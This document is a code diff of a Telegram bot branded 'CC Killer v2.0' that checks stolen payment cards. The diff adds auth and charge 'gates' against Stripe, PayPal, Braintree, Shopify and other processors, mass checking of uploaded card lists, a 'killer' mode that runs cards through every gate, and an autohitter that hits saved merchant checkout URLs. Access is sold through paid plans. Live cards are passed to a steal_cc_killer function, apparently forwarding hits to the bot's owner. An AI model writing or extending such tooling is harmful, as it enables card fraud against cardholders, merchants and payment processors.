@@ -2,35 +2,58 @@ import asyncio
 import os
 from pyrogram import Client, filters, enums
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID, get_user_data, update_user_credits, set_user_vip, set_user_plan, UPI_ID, PAYMENT_QR_URL, WELCOME_PHOTO_URL, get_asset_path, DEVELOPER_NAME, PROJECT_NAME, PROJECT_TAG
+from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID, get_user_data, update_user_credits, set_user_vip, set_user_plan, UPI_ID, PAYMENT_QR_URL, WELCOME_PHOTO_URL, get_asset_path, DEVELOPER_NAME, PROJECT_NAME, PROJECT_TAG, add_hitter_url, remove_hitter_url, get_hitter_urls, load_hitter_urls
 from security import authorized_filter, check_flood
 import time
 from tokenizer import extract_cards
-from api_killer import run_all_gates, mass_killer
+from api_killer import run_all_gates, mass_killer, mass_specific_gate_runner
 from stlear_killer import steal_cc_killer
 from bin_detector import get_bin_info
 from generator import generate_cards
+from database import db
 
 # Session persistence - prevents FloodWait on every deploy
 SESSION_STRING = os.getenv("SESSION_STRING", "")
 
 if SESSION_STRING:
-    # Use persistent session (no re-authentication needed)
     app = Client("cc_killer_bot", session_string=SESSION_STRING, api_id=API_ID, api_hash=API_HASH)
     print("✅ Using persistent session")
 else:
-    # Fallback to bot token (may cause FloodWait on frequent deploys)
     app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
     print("⚠️ No SESSION_STRING set - using BOT_TOKEN (may cause FloodWait)")
 
+# Store pending check data per user
+pending_checks = {}
+pending_mass_checks = {}
+pending_autohit = {}
+
+# Gate definitions for Auth vs Charged
+AUTH_GATES = {
+    "shopify": ("🛒 Shopify Auth", "shopify_auth"),
+    "paypal": ("💰 PayPal Auth", "paypal"),
+    "razorpay": ("🔷 Razorpay", "razorpay"),
+    "stripe": ("💳 Stripe Auth", "stripe"),
+    "braintree": ("🧠 Braintree Auth", "braintree"),
+    "nmi": ("🔷 NMI Auth", "nmi"),
+    "payflow": ("⚡ PayFlow Auth", "payflow"),
+    "vbv": ("🔐 VBV 3D Auth", "vbv"),
+}
+
+CHARGED_GATES = {
+    "shopify": ("🛒 Shopify Charge", "shopify"),
+    "paypal": ("💰 PayPal Charge", "paypal_charge"),
+    "razorpay": ("🔷 Razorpay Charge", "razorpay_charge"),
+    "stripe": ("💳 Stripe Charge", "stripe_charge"),
+    "braintree": ("🧠 Braintree Charge", "braintree_charge"),
+    "fastspring": ("🚀 FastSpring Charge", "fastspring"),
+}
+
 async def get_text_from_message(client, message):
     """Helper to get text from message OR file."""
-    # Supported file extensions
     ALLOWED_EXTENSIONS = ('.txt', '.cc', '.csv', '.log', '.dat', '.list')
     
-    # 1. Check if message has document
     if message.document:
-        if message.document.file_size > 1024 * 1024 * 5: # 5MB Limit
+        if message.document.file_size > 1024 * 1024 * 5:
             return None, "❌ File too large (Max 5MB)."
         
         file_name = message.document.file_name.lower() if message.document.file_name else ""
@@ -40,11 +63,9 @@ async def get_text_from_message(client, message):
         dl_path = await client.download_media(message)
         with open(dl_path, "r", encoding="utf-8", errors="ignore") as f:
             content = f.read()
-        import os
-        os.remove(dl_path) # Clean up
+        os.remove(dl_path)
         return content, None
 
-    # 2. Check reply has document
     if message.reply_to_message and message.reply_to_message.document:
         doc = message.reply_to_message.document
         if doc.file_size > 1024 * 1024 * 5:
@@ -57,53 +78,91 @@ async def get_text_from_message(client, message):
         dl_path = await client.download_media(message.reply_to_message)
         with open(dl_path, "r", encoding="utf-8", errors="ignore") as f:
             content = f.read()
-        import os
         os.remove(dl_path)
         return content, None
 
-    # 3. Text fallback - prioritize replied message text
-    # If user is replying with just a command, get text from the replied message
     if message.reply_to_message and message.reply_to_message.text:
         return message.reply_to_message.text, None
     
-    # Check if message has text beyond just the command
     if message.text:
-        # Strip the command itself (e.g., "/setproxy" from the start)
-        parts = message.text.split(None, 1)  # Split on first whitespace
+        parts = message.text.split(None, 1)
         if len(parts) > 1:
-            return parts[1], None  # Return text after command
+            return parts[1], None
     
     return "", None
 
 @app.on_message(filters.command(["start", "help"]))
 async def start_cmd(client, message):
-    # Boot Animation
     loading_msg = await message.reply("<b>Starting OracleBot... Hold on ✋</b>")
     await asyncio.sleep(2)
     await loading_msg.delete()
+    
+    user = message.from_user
+    user_id = user.id
+    
+    # Check for referral deep link (e.g. /start ref_ABCD1234)
+    referral_code = None
+    if len(message.command) > 1 and message.command[1].startswith("ref_"):
+        referral_code = message.command[1].replace("ref_", "").upper()
+        
+        # Check if user is already registered
+        existing = await db.get_user(user_id)
+        if not existing or not existing.get('is_registered'):
+            # Auto-register with referral
+            user_data = await db.create_user(
+                user_id=user_id,
+                username=user.username,
+                first_name=user.first_name,
+                referral_code=referral_code
+            )
+            if user_data and user_data.get('referred_by'):
+                await message.reply(
+                    f"🎉 <b>Welcome! You've been referred!</b>\n\n"
+                    f"✅ Auto-registered with referral code: <code>{referral_code}</code>\n"
+                    f"💳 You received 10 FREE credits!\n"
+                    f"🎁 Your referrer got +10 credits too!"
+                )
 
-    data = get_user_data(message.from_user.id)
+    data = get_user_data(user_id)
+    
+    # Get DB user data for accurate credits
+    db_user = await db.get_user(user_id)
+    credits_display = 'UNLIMITED' if data.get('is_vip') else (db_user.get('credits', data.get('credits', 0)) if db_user else data.get('credits', 0))
+    
     welcome_text = f"""
 💀 <b>WELCOME TO CC KILLER v2.0</b> 💀
 ━━━━━━━━━━━━━━━━━━━━━━━
 <i>The industry's most powerful, bulletproof, and turbo-charged CC checker is at your service.</i>
 
 📌 <b>USER INFO:</b>
-• ID: <code>{message.from_user.id}</code>
-• Credits: <b>{data['credits'] if not data['is_vip'] else 'UNLIMITED'}</b>
+• ID: <code>{user_id}</code>
+• Credits: <b>{credits_display}</b>
 • Plan: <b>{data['plan']}</b>
 {f"• Expiry: <code>{data['expiry']}</code>" if data.get('expiry') else ""}
 
 🚀 <b>SPEED:</b> 0.3s/card | 150+ Parallel
 🛡️ <b>SECURITY:</b> Proxy Bound & Anti-Flood
-⚔️ <b>GATES:</b> Stripe, BT, Amazon, Hitter, NMI, Payflow, Shopify, VBV
+
+<b>📜 QUICK START:</b>
+• <code>/register</code> » Create Account
+• <code>/chk</code> » Single Card Checker
+• <code>/mchk</code> » Mass Card Checker
+• <code>/kl</code> » CC Killer (Single)
+• <code>/referral</code> » Earn Credits!
 
 <b>Press the buttons below to interact:</b>
 """
     
     keyboard = InlineKeyboardMarkup([
         [
+            InlineKeyboardButton("📝 REGISTER", callback_data="quick_register"),
+            InlineKeyboardButton("👤 PROFILE", callback_data="quick_profile"),
+        ],
+        [
             InlineKeyboardButton("⚡ CHECKER COMMANDS", callback_data="show_cmds"),
+        ],
+        [
+            InlineKeyboardButton("🎯 AUTOHITTER", callback_data="show_autohitter"),
         ],
         [
             InlineKeyboardButton("💎 VIEW PLANS", callback_data="show_plans"),
@@ -124,28 +183,94 @@ async def start_cmd(client, message):
 @app.on_callback_query()
 async def handle_callbacks(client, callback_query):
     data = callback_query.data
+    user_id = callback_query.from_user.id
+    user = callback_query.from_user
     
-    if data == "show_cmds":
+    # Quick register from menu
+    if data == "quick_register":
+        existing = await db.get_user(user_id)
+        if existing and existing.get('is_registered'):
+            await callback_query.answer("Already registered! Use /profile to view.")
+            return
+        
+        user_data = await db.create_user(
+            user_id=user_id,
+            username=user.username,
+            first_name=user.first_name
+        )
+        
+        if user_data:
+            await callback_query.answer("Registered successfully! 🎉")
+            await callback_query.edit_message_text(
+                f"🎉 <b>REGISTRATION SUCCESSFUL!</b>\n\n"
+                f"👤 <b>Name:</b> {user.first_name}\n"
+                f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
+                f"💳 <b>Credits:</b> 10 (Welcome Gift!)\n"
+                f"🎁 <b>Your Referral Code:</b> <code>{user_data.get('referral_code')}</code>\n\n"
+                f"Share your referral code to earn +10 credits for each signup!\n"
+                f"Use /referral to get your share link.",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back_start")]])
+            )
+        return
+    
+    # Quick profile from menu
+    elif data == "quick_profile":
+        user_data = await db.get_user(user_id)
+        if not user_data or not user_data.get('is_registered'):
+            await callback_query.answer("Not registered! Click REGISTER first.")
+            return
+        
+        await callback_query.answer()
+        await callback_query.edit_message_text(
+            f"👤 <b>YOUR PROFILE</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 <b>Name:</b> {user_data.get('first_name', 'N/A')}\n"
+            f"🆔 <b>ID:</b> <code>{user_id}</code>\n\n"
+            f"💰 <b>Credits:</b> {'UNLIMITED' if user_data.get('is_vip') else user_data.get('credits', 0)}\n"
+            f"📈 <b>Plan:</b> {user_data.get('plan', 'FREE')}\n\n"
+            f"🎁 <b>Referral Code:</b> <code>{user_data.get('referral_code', 'N/A')}</code>\n"
+            f"👥 <b>Referrals:</b> {user_data.get('referral_count', 0)}",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔗 GET REFERRAL LINK", callback_data="show_referral")],
+                [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
+            ])
+        )
+        return
+    
+    # Show referral link
+    elif data == "show_referral":
+        user_data = await db.get_user(user_id)
+        if not user_data:
+            await callback_query.answer("Not registered!")
+            return
+        
+        bot_info = await client.get_me()
+        referral_link = f"https://t.me/{bot_info.username}?start=ref_{user_data.get('referral_code')}"
+        
+        await callback_query.answer()
+        await callback_query.edit_message_text(
+            f"🎁 <b>YOUR REFERRAL LINK</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔗 <b>Code:</b> <code>{user_data.get('referral_code')}</code>\n\n"
+            f"📎 <b>Share Link:</b>\n<code>{referral_link}</code>\n\n"
+            f"👥 <b>Total Referrals:</b> {user_data.get('referral_count', 0)}\n"
+            f"💰 <b>Credits Earned:</b> {user_data.get('referral_count', 0) * 10}\n\n"
+            f"<i>💡 Share your link! +10 credits per signup!</i>",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="quick_profile")]])
+        )
+        return
+    
+    elif data == "show_cmds":
         cmd_text = """
 <b>╭── ⚡ CHECKER COMMANDS ⚡ ──╮</b>
 
-<b>🟢 MASS & MASTER</b>
- ├ <code>/mchk</code> » Multi-Gate Turbo
- ├ <code>/chk</code>  » Single Check
- └ <code>/gen</code>  » Card Generator
-
-<b>🟡 GATEWAYS (Add 'm' for Mass)</b>
- <code>/str  - Stripe</code>   ┃ <code>/az   - Amazon</code>
- <code>/shpa - Shopify</code>  ┃ <code>/vbv  - VBV 3D</code>
- <code>/ppal - PayPal</code>   ┃ <code>/as   - S-Auth</code>
- <code>/btn  - BrainTr</code>  ┃ <code>/nmi  - NMI</code>
- <code>/payf - PayFlow</code>  ┃ <code>/saw  - AutoWoo</code>
- <code>/sk   - StripeSK</code> ┃ <code>/skc  - SK CCN</code>
- <code>/bt   - BrainAuth</code>┃ <code>/btc  - Charge</code>
- <code>/fs   - FastSpr</code>  ┃ <code>/ash  - AdvShop</code>
- <code>/hit  - Hitter</code>   ┃ <code>/ck   - Killer</code>
+<b>🟢 MAIN COMMANDS</b>
+ ├ <code>/chk</code> » Single Card Checker
+ ├ <code>/mchk</code> » Mass Card Checker
+ └ <code>/kl</code>  » CC Killer (Single)
 
 <b>🔵 TOOLS & MANAGE</b>
+ ├ <code>/gen</code> » Card Generator
  ├ <code>/setproxy</code> » Set Proxy
  ├ <code>/addsite</code>  » Add Merchant
  └ <code>/plans</code>    » Subscription
@@ -154,8 +279,8 @@ async def handle_callbacks(client, callback_query):
         """
         await callback_query.answer()
         await callback_query.edit_message_text(cmd_text, reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("� COMMAND GUIDE (Read Me)", callback_data="show_guide")],
-            [InlineKeyboardButton("�🔙 BACK", callback_data="back_start")]
+            [InlineKeyboardButton("📘 COMMAND GUIDE", callback_data="show_guide")],
+            [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
         ]))
         
     elif data == "show_guide":
@@ -163,23 +288,19 @@ async def handle_callbacks(client, callback_query):
 <b>📘 DETAILED USER GUIDE</b>
 ━━━━━━━━━━━━━━━━━━━━━━━
 
-<b>1️⃣ WHAT ARE THE GATES?</b>
-• <b>AUTH:</b> Checks if card is live by authorizing $0 or $1 (No charge). Use: <code>/str</code>, <code>/btn</code>, <code>/as</code>.
-• <b>CHARGE:</b> Tries to charge money (e.g. $0.5, $10). Good for debit cards. Use: <code>/btc</code>, <code>/fsc</code>.
-• <b>CCN:</b> Checks if card number is valid (Live but maybe no funds). Use: <code>/skc</code>.
+<b>1️⃣ WHAT ARE THE CHECK TYPES?</b>
+• <b>AUTH:</b> Checks if card is live by authorizing $0 or $1 (No charge).
+• <b>CHARGED:</b> Tries to charge money (e.g. $0.5, $10). Good for debit cards.
 
-<b>2️⃣ HOW TO MASS CHECK?</b>
-• <b>Method A (Text):</b> /mchk card1|mid|exp|cvv card2|...
-• <b>Method B (File):</b> Upload a <b>.txt</b> file with cards and caption it <code>/mchk</code> or <code>/mstr</code>.
-• <i>Turbo Mode:</i> <code>/mchk</code> checks ALL gates at once!
+<b>2️⃣ HOW TO USE CHECKER?</b>
+• <b>/chk:</b> Single card → Select Auth/Charged → Select Gate → Check!
+• <b>/mchk:</b> Upload .txt or paste cards → Select Auth/Charged → Select Gate → Check!
 
-<b>3️⃣ PROXY SYSTEM</b>
-• <b>Mandatory for Shopify:</b> Shopify blocks spam. You MUST set a proxy using <code>/setproxy</code> to use <code>/shp</code>.
-• <b>Privacy:</b> Proxies keep the bot safe and your checks anonymous.
+<b>3️⃣ CC KILLER (/kl)</b>
+• The Killer runs your card through ALL gates aggressively until it finds a hit.
 
-<b>4️⃣ TERMINOLOGY</b>
-• <b>Hit (Forward):</b> If a card is LIVE, it gets forwarded to the owner (You!).
-• <b>Killer:</b> The "Master" gate that tries everything.
+<b>4️⃣ PROXY SYSTEM</b>
+• <b>Shopify requires Proxy:</b> Use <code>/setproxy http://user:pass@ip:port</code>
 
 <i>"Quality over Quantity - Always check your BIN first!"</i>
         """
@@ -204,7 +325,7 @@ async def handle_callbacks(client, callback_query):
         ]))
         
     elif data == "show_plans":
-        plans_text = """
+        plans_text = f"""
 💎 <b>AVAILABLE PLANS:</b>
 ━━━━━━━━━━━━━━━━━━━━━━━
 🔰 <b>BASIC PLAN</b>
@@ -251,7 +372,7 @@ async def handle_callbacks(client, callback_query):
 ━━━━━━━━━━━━━━━━━━━━━━━
 🆔 <b>UPI ID:</b> <code>{UPI_ID}</code>
 
-📸 <b>Send screenshot after payment to:</b> @your_support_link
+📸 <b>Send screenshot after payment to:</b> @Oracle0812
         """
         await callback_query.answer()
         qr_path = get_asset_path(PAYMENT_QR_URL)
@@ -265,7 +386,6 @@ async def handle_callbacks(client, callback_query):
         user = callback_query.from_user
         await callback_query.answer(f"Request for {plan} sent to owner!", show_alert=True)
         
-        # Notify Owner
         owner_msg = f"""
 🆕 <b>PLAN REQUEST</b>
 ━━━━━━━━━━━━━━━━━━━━━━━
@@ -286,77 +406,202 @@ async def handle_callbacks(client, callback_query):
         await callback_query.edit_message_text("✅ <b>Request Sent!</b>\nPlease wait for the owner to approve your request.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back_start")]]))
 
     elif data.startswith("app_"):
-        # Format: app_PLAN_USERID
-        _, plan, user_id = data.split("_")
-        user_id = int(user_id)
+        _, plan, target_user_id = data.split("_")
+        target_user_id = int(target_user_id)
         
-        if set_user_plan(user_id, plan):
-            await callback_query.answer(f"User {user_id} approved for {plan}!")
-            await callback_query.edit_message_text(f"✅ <b>Approved!</b>\nUser <code>{user_id}</code> now has the <b>{plan}</b> plan.")
+        if set_user_plan(target_user_id, plan):
+            await callback_query.answer(f"User {target_user_id} approved for {plan}!")
+            await callback_query.edit_message_text(f"✅ <b>Approved!</b>\nUser <code>{target_user_id}</code> now has the <b>{plan}</b> plan.")
         else:
             await callback_query.answer("Error setting plan!")
         
-        # Notify User
         try:
-            await client.send_message(user_id, f"🎉 <b>CONGRATULATIONS!</b>\nYour request for the <b>{plan}</b> plan has been <b>APPROVED</b> by the owner!\nType /start to see your updated balance.")
+            await client.send_message(target_user_id, f"🎉 <b>CONGRATULATIONS!</b>\nYour request for the <b>{plan}</b> plan has been <b>APPROVED</b> by the owner!\nType /start to see your updated balance.")
         except: pass
 
     elif data.startswith("dec_"):
-        user_id = int(data.split("_")[1])
-        await callback_query.answer(f"Request for {user_id} declined.")
-        await callback_query.edit_message_text(f"❌ <b>Declined!</b>\nUser <code>{user_id}</code> request was rejected.")
+        target_user_id = int(data.split("_")[1])
+        await callback_query.answer(f"Request for {target_user_id} declined.")
+        await callback_query.edit_message_text(f"❌ <b>Declined!</b>\nUser <code>{target_user_id}</code> request was rejected.")
         
-        # Notify User
         try:
-            await client.send_message(user_id, "❌ <b>SORRY!</b>\nYour plan request was <b>DECLINED</b> by the owner. Please contact support for more info.")
+            await client.send_message(target_user_id, "❌ <b>SORRY!</b>\nYour plan request was <b>DECLINED</b> by the owner. Please contact support for more info.")
         except: pass
 
-    elif data.startswith("mchk_"):
-        # Mass check gate selection callback
-        gate = data.replace("mchk_", "")
-        user_id = callback_query.from_user.id
+    # ========== SINGLE CHECK (/chk) FLOW ==========
+    elif data == "chk_auth":
+        if user_id not in pending_checks:
+            await callback_query.answer("❌ Session expired. Run /chk again.")
+            return
+        pending_checks[user_id]["type"] = "auth"
+        await callback_query.answer("Auth mode selected!")
+        await callback_query.edit_message_text(
+            "📊 <b>SELECT GATE:</b>\n\nChoose a gateway for Auth check:",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛒 Shopify", callback_data="chk_gate_shopify")],
+                [InlineKeyboardButton("💰 PayPal", callback_data="chk_gate_paypal")],
+                [InlineKeyboardButton("🔷 Razorpay", callback_data="chk_gate_razorpay")],
+                [InlineKeyboardButton("💳 Stripe", callback_data="chk_gate_stripe")],
+                [InlineKeyboardButton("🧠 Braintree", callback_data="chk_gate_braintree")],
+                [InlineKeyboardButton("🔷 NMI", callback_data="chk_gate_nmi")],
+                [InlineKeyboardButton("⚡ PayFlow", callback_data="chk_gate_payflow")],
+                [InlineKeyboardButton("🔐 VBV 3D", callback_data="chk_gate_vbv")],
+            ])
+        )
+    
+    elif data == "chk_charged":
+        if user_id not in pending_checks:
+            await callback_query.answer("❌ Session expired. Run /chk again.")
+            return
+        pending_checks[user_id]["type"] = "charged"
+        await callback_query.answer("Charged mode selected!")
+        await callback_query.edit_message_text(
+            "📊 <b>SELECT GATE:</b>\n\nChoose a gateway for Charged check:",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛒 Shopify", callback_data="chk_gate_shopify")],
+                [InlineKeyboardButton("💰 PayPal", callback_data="chk_gate_paypal")],
+                [InlineKeyboardButton("🔷 Razorpay", callback_data="chk_gate_razorpay")],
+                [InlineKeyboardButton("💳 Stripe", callback_data="chk_gate_stripe")],
+                [InlineKeyboardButton("🧠 Braintree", callback_data="chk_gate_braintree")],
+                [InlineKeyboardButton("🚀 FastSpring", callback_data="chk_gate_fastspring")],
+            ])
+        )
+    
+    elif data.startswith("chk_gate_"):
+        gate_key = data.replace("chk_gate_", "")
+        if user_id not in pending_checks:
+            await callback_query.answer("❌ Session expired. Run /chk again.")
+            return
         
+        pending_data = pending_checks.pop(user_id)
+        card = pending_data["card"]
+        check_type = pending_data["type"]
+        original_msg = pending_data["message"]
+        
+        if not update_user_credits(user_id, -1):
+            await callback_query.answer("❌ Insufficient credits!")
+            return
+        
+        await callback_query.answer(f"Processing with {gate_key.upper()}...")
+        status_msg = await callback_query.edit_message_text(f"⚡ <b>Checking via {gate_key.upper()} ({check_type.upper()})...</b>")
+        
+        # Get the gate function
+        gate_func = get_gate_function(gate_key, check_type)
+        
+        start_time = time.perf_counter()
+        cc, mm, yy, cvv = card
+        
+        try:
+            from config import get_proxy
+            proxy = get_proxy()
+            result = await gate_func(cc, mm, yy, cvv, proxy)
+        except Exception as e:
+            result = {"status": "error", "response": str(e), "gate": gate_key.upper()}
+        
+        end_time = time.perf_counter()
+        time_taken = f"{end_time - start_time:.2f}"
+        
+        bin_data = get_bin_info(cc[:6])
+        cc_full = '|'.join(card)
+        extrap = f"{cc[:12]}xxxx|{mm}|{yy}|xxx"
+        
+        final_text = f"""
+<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 💀]</b>
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>Card >_</b> <code>{cc_full}</code>
+<b>$Status:</b> {result.get('status', 'N/A').upper()} ✨
+<b>Response >_</b> {result.get('response', 'N/A')}
+<b>$Extrap:</b> <code>{extrap}</code>
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>Bin info >_</b> <code>{cc[:6]}</code> | <b>Country:</b> {bin_data['country']} | {bin_data['flag']}
+<b>$Info:</b> {bin_data['bank']} - {bin_data['type']} - {bin_data['level']}
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>Gate >_</b> {gate_key.upper()} ({check_type.upper()})
+<b>$Proxy:</b> [LIVE ✨!] | <b>Time:</b> [{time_taken} Seconds!]
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>#Developer >_</b> {DEVELOPER_NAME} ☀️
+        """
+        
+        await status_msg.edit(final_text)
+        
+        if result.get('status') in ["approved", "live", "success", "charged"]:
+            result['gate'] = f"{gate_key.upper()} ({check_type.upper()})"
+            await steal_cc_killer(client, original_msg, cc_full, result)
+
+    # ========== MASS CHECK (/mchk) FLOW ==========
+    elif data == "mchk_auth":
+        if user_id not in pending_mass_checks:
+            await callback_query.answer("❌ Session expired. Run /mchk again.")
+            return
+        pending_mass_checks[user_id]["type"] = "auth"
+        await callback_query.answer("Auth mode selected!")
+        await callback_query.edit_message_text(
+            f"📊 <b>SELECT GATE:</b>\n\n📥 Cards loaded: <b>{len(pending_mass_checks[user_id]['cards'])}</b>\n\nChoose a gateway for Auth check:",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛒 Shopify", callback_data="mchk_gate_shopify")],
+                [InlineKeyboardButton("💰 PayPal", callback_data="mchk_gate_paypal")],
+                [InlineKeyboardButton("🔷 Razorpay", callback_data="mchk_gate_razorpay")],
+                [InlineKeyboardButton("💳 Stripe", callback_data="mchk_gate_stripe")],
+                [InlineKeyboardButton("🧠 Braintree", callback_data="mchk_gate_braintree")],
+                [InlineKeyboardButton("🔷 NMI", callback_data="mchk_gate_nmi")],
+                [InlineKeyboardButton("⚡ PayFlow", callback_data="mchk_gate_payflow")],
+                [InlineKeyboardButton("🔐 VBV 3D", callback_data="mchk_gate_vbv")],
+            ])
+        )
+    
+    elif data == "mchk_charged":
+        if user_id not in pending_mass_checks:
+            await callback_query.answer("❌ Session expired. Run /mchk again.")
+            return
+        pending_mass_checks[user_id]["type"] = "charged"
+        await callback_query.answer("Charged mode selected!")
+        await callback_query.edit_message_text(
+            f"📊 <b>SELECT GATE:</b>\n\n📥 Cards loaded: <b>{len(pending_mass_checks[user_id]['cards'])}</b>\n\nChoose a gateway for Charged check:",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛒 Shopify", callback_data="mchk_gate_shopify")],
+                [InlineKeyboardButton("💰 PayPal", callback_data="mchk_gate_paypal")],
+                [InlineKeyboardButton("🔷 Razorpay", callback_data="mchk_gate_razorpay")],
+                [InlineKeyboardButton("💳 Stripe", callback_data="mchk_gate_stripe")],
+                [InlineKeyboardButton("🧠 Braintree", callback_data="mchk_gate_braintree")],
+                [InlineKeyboardButton("🚀 FastSpring", callback_data="mchk_gate_fastspring")],
+            ])
+        )
+    
+    elif data.startswith("mchk_gate_"):
+        gate_key = data.replace("mchk_gate_", "")
         if user_id not in pending_mass_checks:
             await callback_query.answer("❌ Session expired. Run /mchk again.")
             return
         
         pending_data = pending_mass_checks.pop(user_id)
         cards = pending_data["cards"]
+        check_type = pending_data["type"]
         original_msg = pending_data["message"]
         
-        # Credit check
         if not update_user_credits(user_id, -5):
             await callback_query.answer("❌ Insufficient credits!")
             return
         
-        await callback_query.answer(f"Processing with {gate.upper()}...")
-        
-        # Update message to show progress
+        await callback_query.answer(f"Processing with {gate_key.upper()}...")
         total = len(cards)
-        status_msg = await callback_query.edit_message_text(f"📊 <b>Checking {total} cards with {gate.upper()}...</b>")
+        status_msg = await callback_query.edit_message_text(f"📊 <b>Checking {total} cards with {gate_key.upper()} ({check_type.upper()})...</b>")
         
-        if gate == "killer":
-            # Use mass_killer for all gates
-            results = await mass_killer(cards)
-        else:
-            # Use specific gate via run_all_gates
-            from gates import GATE_MAP
-            results = {}
-            for i, card in enumerate(cards):
-                result = await run_all_gates(card, gate_filter=gate)
-                results[card] = result
-                if (i+1) % 5 == 0:
-                    try:
-                        await status_msg.edit(f"📊 <b>{gate.upper()}</b>\nProgress: <code>[{i+1}/{total}]</code>")
-                    except: pass
+        gate_func = get_gate_function(gate_key, check_type)
         
-        # Format results
+        async def update_status(checked, total):
+            if checked % 5 == 0 or checked == total:
+                try:
+                    await status_msg.edit(f"📊 <b>{gate_key.upper()} ({check_type.upper()})</b>\nProgress: <code>[{checked}/{total}]</code>")
+                except: pass
+        
+        results = await mass_specific_gate_runner(cards, gate_func, status_callback=update_status)
+        
         lives = [k for k, v in results.items() if v.get('status') in ["approved", "live", "success", "charged"]]
         
         report = f"""
 📊 <b>MASS CHECK COMPLETE</b>
 ━━━━━━━━━━━━━━━━━━━━━━━
-🎯 Gate: <b>{gate.upper()}</b>
+🎯 Gate: <b>{gate_key.upper()} ({check_type.upper()})</b>
 📊 Stats: <b>{len(lives)}/{total} LIVE</b>
 ✅ Live List:
 """
@@ -370,15 +615,312 @@ async def handle_callbacks(client, callback_query):
         
         for card_cc in lives:
             res = results[card_cc]
+            res['gate'] = f"{gate_key.upper()} ({check_type.upper()})"
             await steal_cc_killer(client, original_msg, card_cc, res)
+
+    # ========== AUTOHITTER FLOW ==========
+    elif data == "show_autohitter":
+        await callback_query.answer()
+        autohitter_text = """
+🎯 <b>AUTOHITTER MENU</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+<i>Autohitter allows you to add checkout links for Stripe and Braintree gates. Bot will auto-hit on these websites with your cards.</i>
+
+<b>Supported Gateways:</b>
+• 💳 Stripe Checkout
+• 🧠 Braintree Checkout
+
+<b>Select Gateway to Manage:</b>
+        """
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("💳 STRIPE HITTER", callback_data="hitter_stripe")],
+            [InlineKeyboardButton("🧠 BRAINTREE HITTER", callback_data="hitter_braintree")],
+            [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
+        ])
+        await callback_query.edit_message_text(autohitter_text, reply_markup=keyboard)
+    
+    elif data.startswith("hitter_") and not data.startswith("hitter_add_") and not data.startswith("hitter_run_") and not data.startswith("hitter_del_"):
+        gateway = data.replace("hitter_", "")
+        urls = get_hitter_urls(gateway)
+        
+        menu_text = f"""
+🎯 <b>{gateway.upper()} AUTOHITTER</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+<b>Saved URLs:</b> {len(urls)}
+"""
+        if urls:
+            for i, url in enumerate(urls[:5], 1):
+                short_url = url[:40] + "..." if len(url) > 40 else url
+                menu_text += f"{i}. <code>{short_url}</code>\n"
+            if len(urls) > 5:
+                menu_text += f"<i>...and {len(urls)-5} more</i>\n"
+        else:
+            menu_text += "<i>No URLs added yet.</i>\n"
+        
+        menu_text += "\n<b>Select an action:</b>"
+        
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("➕ ADD URL", callback_data=f"hitter_add_{gateway}")],
+            [InlineKeyboardButton("📋 VIEW ALL URLs", callback_data=f"hitter_view_{gateway}")],
+            [InlineKeyboardButton("🗑️ REMOVE URL", callback_data=f"hitter_rem_{gateway}")],
+            [InlineKeyboardButton("🚀 RUN AUTOHIT", callback_data=f"hitter_run_{gateway}")],
+            [InlineKeyboardButton("🔙 BACK", callback_data="show_autohitter")]
+        ])
+        await callback_query.answer()
+        await callback_query.edit_message_text(menu_text, reply_markup=keyboard)
+    
+    elif data.startswith("hitter_add_"):
+        gateway = data.replace("hitter_add_", "")
+        pending_autohit[user_id] = {"action": "add", "gateway": gateway}
+        await callback_query.answer()
+        await callback_query.edit_message_text(
+            f"➕ <b>ADD {gateway.upper()} URL</b>\n\n"
+            f"Send the checkout URL for {gateway.upper()} gateway.\n\n"
+            f"<b>Example:</b>\n<code>https://checkout.stripe.com/pay/cs_live_xxx#xxx</code>\n\n"
+            f"<i>Send the URL now or /cancel to abort.</i>",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data=f"hitter_{gateway}")]])
+        )
+    
+    elif data.startswith("hitter_view_"):
+        gateway = data.replace("hitter_view_", "")
+        urls = get_hitter_urls(gateway)
+        
+        if not urls:
+            await callback_query.answer("No URLs added yet!")
+            return
+        
+        view_text = f"📋 <b>ALL {gateway.upper()} URLs</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n"
+        for i, url in enumerate(urls, 1):
+            view_text += f"{i}. <code>{url}</code>\n"
+        
+        await callback_query.answer()
+        await callback_query.edit_message_text(
+            view_text,
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data=f"hitter_{gateway}")]])
+        )
+    
+    elif data.startswith("hitter_rem_"):
+        gateway = data.replace("hitter_rem_", "")
+        urls = get_hitter_urls(gateway)
+        
+        if not urls:
+            await callback_query.answer("No URLs to remove!")
+            return
+        
